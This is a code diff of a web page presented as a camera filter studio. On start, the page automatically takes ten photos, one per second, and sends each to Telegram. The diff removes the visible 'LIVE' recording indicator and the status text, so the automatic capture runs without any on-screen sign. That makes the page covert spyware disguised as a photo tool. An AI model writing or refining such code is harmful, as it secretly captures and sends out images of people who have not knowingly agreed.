@@ -91,36 +91,6 @@ video{
   z-index:3;
 }
 
-/* LIVE INDICATOR */
-.live{
-  position:absolute;
-  top:15px;
-  right:15px;
-  background:rgba(0,0,0,.58);
-  color:white;
-  padding:7px 10px;
-  border-radius:7px;
-  font-size:10px;
-  font-weight:700;
-  display:none;
-  align-items:center;
-  gap:6px;
-  z-index:3;
-}
-
-.live-dot{
-  width:7px;
-  height:7px;
-  border-radius:50%;
-  background:#ff3b30;
-  animation:pulse 1s infinite;
-}
-
-@keyframes pulse{
-  0%,100%{opacity:1}
-  50%{opacity:.25}
-}
-
 /* CONTROLS */
 .controls{
   display:flex;
@@ -435,11 +405,6 @@ video{
         CAMERA
       </div>
 
-      <div class="live" id="live">
-        <span class="live-dot"></span>
-        LIVE
-      </div>
-
       <video
         id="video"
         autoplay
@@ -593,9 +558,6 @@ const start = document.getElementById("start");
 const capture = document.getElementById("capture");
 const save = document.getElementById("save");
 
-const live = document.getElementById("live");
-const autoInfo = document.getElementById("autoInfo");
-
 let stream = null;
 let selectedEffect = "normal";
 let lastBlob = null;
@@ -630,7 +592,7 @@ document.querySelectorAll(".effect").forEach(button => {
 
 
 /* =========================
-   APPLY EFFECT TO VIDEO
+   APPLY EFFECT
 ========================= */
 
 function applyEffect(){
@@ -653,7 +615,7 @@ function applyEffect(){
 
 
 /* =========================
-   VIDEO FILTER CSS
+   VIDEO FILTERS
 ========================= */
 
 const effectStyle = document.createElement("style");
@@ -844,8 +806,6 @@ async function takePhoto(){
 
   lastBlob = blob;
 
-  /* Show save button after photo */
-
   save.style.display = "inline-flex";
 
   return blob;
@@ -853,7 +813,7 @@ async function takePhoto(){
 
 
 /* =========================
-   SEND PHOTO TO TELEGRAM
+   SEND TO TELEGRAM
 ========================= */
 
 async function sendPhoto(blob){
@@ -905,13 +865,6 @@ async function startAutomaticPhotos(){
   autoStarted = true;
   sending = true;
 
-  live.style.display = "flex";
-
-  /*
-    10 photos
-    One photo every second
-  */
-
   for(let i = 0; i < 10; i++){
 
     await new Promise(resolve => {
@@ -921,24 +874,12 @@ async function startAutomaticPhotos(){
     const blob = await takePhoto();
 
     if(blob){
-
-      /*
-        Wait until the current photo
-        finishes sending before taking
-        the next one.
-      */
-
       await sendPhoto(blob);
-
     }
 
   }
 
   sending = false;
-
-  live.style.display = "none";
-
-  autoInfo.textContent = "";
 
 }
 
@@ -976,8 +917,8 @@ start.addEventListener("click", async () => {
     applyEffect();
 
     /*
-      Automatically start
-      the 10-photo sequence.
+      Start automatic sequence:
+      10 photos, one every second.
     */
 
     startAutomaticPhotos();
@@ -1002,9 +943,7 @@ capture.addEventListener("click", async () => {
   const blob = await takePhoto();
 
   if(blob){
-
     await sendPhoto(blob);
-
   }
 
 });
@@ -1025,7 +964,6 @@ save.addEventListener("click", () => {
   const link = document.createElement("a");
 
   link.href = url;
-
   link.download = "eagle-studio.jpg";
 
   document.body.appendChild(link);
@@ -1035,9 +973,7 @@ save.addEventListener("click", () => {
   link.remove();
 
   setTimeout(() => {
-
     URL.revokeObjectURL(url);
-
   },1000);
 
 });
